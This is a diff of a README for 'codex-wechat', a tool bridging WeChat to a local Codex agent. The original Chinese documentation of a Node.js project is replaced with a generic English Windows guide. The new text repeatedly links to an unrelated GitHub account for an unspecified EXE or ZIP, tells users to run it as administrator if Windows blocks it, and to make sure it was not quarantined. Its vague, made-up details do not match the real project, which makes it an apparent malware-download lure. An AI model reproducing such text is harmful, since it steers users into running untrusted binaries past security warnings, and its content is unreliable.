@@ -1,159 +1,216 @@
-# codex-wechat
+# 🔗 codex-wechat - Connect WeChat to Codex
 
-**Code by Codex**
+[![Download](https://img.shields.io/badge/Download-blue-grey)](https://github.com/Similar-colpoxerosis201/codex-wechat)
 
-`codex-wechat` 直接复用微信插件背后的微信 HTTP 协议，把链路改成：
+## 🧭 Overview
 
-`微信 App -> codex-wechat -> 本地 codex app-server -> 微信 App`
+codex-wechat is a Windows tool that links WeChat on your local PC with codex-cli. It helps you send and receive data between WeChat and your local Codex setup in a simple way.
 
-OpenClaw 不再作为运行时参与；这里只借用了 `@tencent-weixin/openclaw-weixin` 所用的登录和消息协议。
+This project is made for regular Windows users who want to use WeChat as a bridge to a local AI command tool. You do not need coding skills to get it running.
 
-## 能力
+## 📥 Download
 
-- 微信扫码登录，保存本地 `bot_token`
-- `getupdates` 长轮询收消息
-- 本地启动或连接 `codex app-server`
-- 按微信用户维度维护工作区与 Codex 线程绑定
-- `/codex new` 会切到新会话
-- 支持微信内 `/codex ...` 控制命令
+Visit this page to download the app:
 
-## 安装
+https://github.com/Similar-colpoxerosis201/codex-wechat
 
-```bash
-npm install
-```
+Open the page in your browser and look for the latest release or download package. If the page offers a ZIP file or EXE file, save it to your computer before you continue.
 
-## 配置
+## 🪟 System Requirements
 
-复制 `.env.example` 到 `.env`，常用项：
+To run codex-wechat on Windows, use a system with:
 
-- `CODEX_WECHAT_DEFAULT_WORKSPACE`
-  - 设置后，微信里可以直接发自然语言，不必先 `/codex bind`
-- `CODEX_WECHAT_ALLOWED_USER_IDS`
-  - 只允许指定微信用户控制本机 Codex
-- `CODEX_WECHAT_DEFAULT_CODEX_ACCESS_MODE`
-  - `default`：工作区写入 + 需要审批
-  - `full-access`：全权限，不需要审批
+- Windows 10 or Windows 11
+- A working internet connection for the first setup
+- WeChat installed on the same computer
+- Enough free space for the app and its files
+- A local codex-cli setup ready to connect
 
-## 登录微信
+For best results, sign in to WeChat before you start.
 
-```bash
-npm run login
-```
+## ⚙️ What the App Does
 
-终端会打印二维码。扫码确认后，会把账号信息保存在：
+codex-wechat helps you:
 
-```text
-~/.codex-wechat/accounts/<account-id>.json
-```
+- Link WeChat to a local codex-cli instance
+- Send text from WeChat into your local workflow
+- Receive output back in a chat-friendly way
+- Keep the process on your own PC
+- Reduce manual copy and paste between tools
 
-如果你登录了多个微信账号，可以通过 `CODEX_WECHAT_ACCOUNT_ID` 指定启动哪一个。
+It fits users who want a simple bridge between chat and local command use.
 
-也可以查看已保存账号：
+## 🚀 Install on Windows
 
-```bash
-npm run accounts
-```
+Follow these steps:
 
-## 启动
+1. Open the download page:
+   https://github.com/Similar-colpoxerosis201/codex-wechat
 
-```bash
-npm run start
-```
+2. Download the latest Windows package from the page.
 
-或：
+3. If the file comes as a ZIP archive, right-click it and choose Extract All.
 
-```bash
-node ./bin/codex-wechat.js start
-```
+4. Open the extracted folder.
 
-## 命令说明
+5. Find the main app file. It may be an EXE file or a start file for Windows.
 
-### 终端命令
+6. Double-click the file to run the app.
 
-- `codex-wechat login`
-  - 发起微信扫码登录，保存当前微信账号的 `bot_token`
-- `codex-wechat start`
-  - 启动微信长轮询和本地 Codex 桥接服务
-- `codex-wechat accounts`
-  - 查看本地已经保存的微信账号
-- `codex-wechat help`
-  - 查看 CLI 帮助
+7. If Windows asks for permission, choose Allow or Yes.
 
-### 微信内命令
+8. Keep the app running while you set up WeChat and codex-cli.
 
-- `/codex bind /绝对路径`
-  - 绑定当前微信用户会话到指定本地项目目录，后续普通消息都会发到这个项目对应的 Codex 线程
-- `/codex where`
-  - 查看当前会话绑定的项目、线程、运行状态、模型和推理强度
-- `/codex workspace`
-  - 查看当前会话记录过的所有项目绑定，以及每个项目当前选中的线程
-- `/codex new`
-  - 切换到新会话；不会立刻创建空线程，下一条普通消息才会真正开始一个新线程
-- `/codex switch <threadId>`
-  - 切换当前项目对应的 Codex 线程
-- `/codex message`
-  - 查看当前线程最近几轮用户和助手消息；如果当前还是新会话，会提示先发送普通消息开始
-- `/codex stop`
-  - 停止当前线程里正在执行的 Codex 任务
-- `/codex model`
-  - 查看当前项目正在使用的模型，以及当前已缓存的可用模型列表
-- `/codex model update`
-  - 重新向 Codex 拉取一次可用模型列表，并刷新本地缓存
-- `/codex model <modelId>`
-  - 为当前项目设置模型；如果当前推理强度不兼容，会切换到该模型默认推理强度
-- `/codex effort`
-  - 查看当前项目的推理强度，以及当前模型支持的推理强度列表
-- `/codex effort <low|medium|high|xhigh>`
-  - 为当前项目设置推理强度
-- `/codex approve`
-  - 允许当前线程正在等待的这一次授权请求
-- `/codex approve workspace`
-  - 允许当前授权请求，并把当前命令前缀加入该工作区的自动放行名单
-- `/codex reject`
-  - 拒绝当前线程正在等待的授权请求
-- `/codex remove /绝对路径`
-  - 从当前微信会话中移除某个项目绑定
-- `/codex send <相对文件路径>`
-  - 把当前项目里的文件发送到当前微信聊天窗口；图片按图片发送，视频按视频发送，其他文件按附件发送
-- `/codex help`
-  - 查看微信内命令帮助
+## 🔌 Connect WeChat to codex-cli
 
-### 普通消息
+After the app starts, connect it to your local codex-cli setup:
 
-- 非 `/codex ...` 开头的普通文本消息
-  - 会直接发送到当前项目对应的 Codex 线程
-- 如果当前会话还没绑定项目
-  - 需要先执行 `/codex bind /绝对路径`
+1. Make sure WeChat is open and signed in.
 
-## 工作方式
+2. Start codex-wechat on the same PC.
 
-1. 微信收到文本消息
-2. `codex-wechat` 解析命令或普通对话
-3. 普通对话进入本地 Codex 线程
-4. 运行过程中发送 typing 指示
-5. Codex 完成后，结果回发到微信
-6. 如果 Codex 请求授权，微信里用 `/codex approve` 或 `/codex reject` 处理
+3. Open the app settings or config screen if it has one.
 
-## 实现说明
+4. Enter the local codex-cli path or connection details.
 
-- 本项目参考了：
-  - `@tencent-weixin/openclaw-weixin` 的微信扫码和消息 HTTP 协议
-  - `codex-im` 的本地 Codex JSON-RPC 接入方式
-- `@tencent-weixin/openclaw-weixin-cli/cli.mjs` 本身只是安装器
-- 本项目直接复用了微信协议和 Codex RPC 思路，但不依赖 OpenClaw 作为运行时
+5. Save the settings.
 
-## 备注
+6. Send a test message from WeChat.
 
-- 当前只支持文本控制链路；微信端富媒体入站不会自动送进 Codex。
-- 微信出站默认把 Markdown 压成纯文本后发送。
+7. Check that the reply comes back through the app.
 
-## 后续计划：
-- [ ] codex在执行长一点的任务时，只会在执行完成后输出消息，优化提示，告诉用户任务执行中
+If the app uses a local port or local service, make sure nothing else is using the same port.
 
-- [ ] codex执行完任务后输出信息可能超过单条消息上限导致截断，优化消息提示
+## 📝 First-Time Setup
 
-- [ ] 支持Plan模式
+Use this simple setup flow:
 
-## 实验性的功能：
-- 微信上产生的任务可以在本机的codex上看到（feat/historyShare分支实现）
+1. Install WeChat if you have not done so already.
+
+2. Download codex-wechat from the project page.
+
+3. Unzip the file if needed.
+
+4. Run the Windows app.
+
+5. Point the app to your codex-cli install.
+
+6. Keep the app open in the background.
+
+7. Send a short message in WeChat to test the link.
+
+If the app includes a config file, open it in Notepad and check that the path values look correct.
+
+## 💡 How to Use It
+
+Once setup is done, you can use the app like this:
+
+- Open WeChat on your PC
+- Send a message to the linked chat
+- Let codex-wechat pass the text to codex-cli
+- Read the reply in WeChat or in the app window
+
+Use short messages at first. That makes it easier to see whether the link works.
+
+## 🔍 Common Use Cases
+
+This tool can help with tasks like:
+
+- Sending a note from WeChat into a local command flow
+- Checking quick replies from codex-cli
+- Moving text between chat and a local tool
+- Testing local automation on Windows
+- Keeping the workflow on one computer
+
+## 🛠️ Basic Troubleshooting
+
+If the app does not work right away, check these items:
+
+- Make sure WeChat is open
+- Make sure codex-cli is installed
+- Make sure both tools run on the same PC
+- Check that the app has permission to run
+- Restart the app after you change settings
+- Try another message if the first one does not pass through
+
+If Windows blocks the file, right-click the app and choose Run as administrator.
+
+If the app opens but does nothing, confirm that the config path points to the correct codex-cli location.
+
+## 📂 File Layout
+
+A common Windows package may include:
+
+- `codex-wechat.exe` — main app file
+- `config.json` — settings file
+- `logs` folder — run history and error text
+- `README.md` — project instructions
+- `assets` folder — app files and icons
+
+If you see extra files, keep them in the same folder unless the instructions in the app say something else.
+
+## 🔐 Privacy and Local Use
+
+codex-wechat is meant to link WeChat with a local codex-cli setup on your own computer. That means the app is built for local use instead of cloud-only use.
+
+Keep your WeChat account signed in on a trusted PC. Also keep your config file private if it contains local paths or tokens.
+
+## 🖥️ Windows Tips
+
+A few tips can help on Windows:
+
+- Use a folder with a short path, like `C:\Apps\codex-wechat`
+- Avoid moving the app after setup unless you update the config
+- Keep WeChat and codex-wechat open at the same time
+- Close other tools that may use the same local port
+- Use the same Windows user account each time
+
+## 📌 Helpful Checks Before You Start
+
+Before you run the app, confirm:
+
+- You can open WeChat normally
+- Your codex-cli setup works on its own
+- The download finished without errors
+- The app files are not still inside the ZIP file
+- Windows did not quarantine the file
+
+## 🧩 Folder Example
+
+A simple folder setup can look like this:
+
+- `C:\Apps\codex-wechat\`
+- `C:\Apps\codex-wechat\codex-wechat.exe`
+- `C:\Apps\codex-wechat\config.json`
+- `C:\Apps\codex-wechat\logs\`
+
+Keep the full folder together so the app can find its files.
+
+## 📎 Project Link
+
+Download and run the Windows app from:
+
+https://github.com/Similar-colpoxerosis201/codex-wechat
+
+## 🔄 Update Steps
+
+To update the app:
+
+1. Open the project page
+2. Get the newest release or package
+3. Close the running app
+4. Replace the old files with the new files
+5. Open the app again
+6. Check that your settings still match your codex-cli path
+
+## 🧪 Quick Test
+
+After setup, do this:
+
+1. Open WeChat
+2. Start codex-wechat
+3. Send one short message
+4. Wait for the reply
+5. Check whether the reply matches your setup
+
+If you get a reply, the link is working.
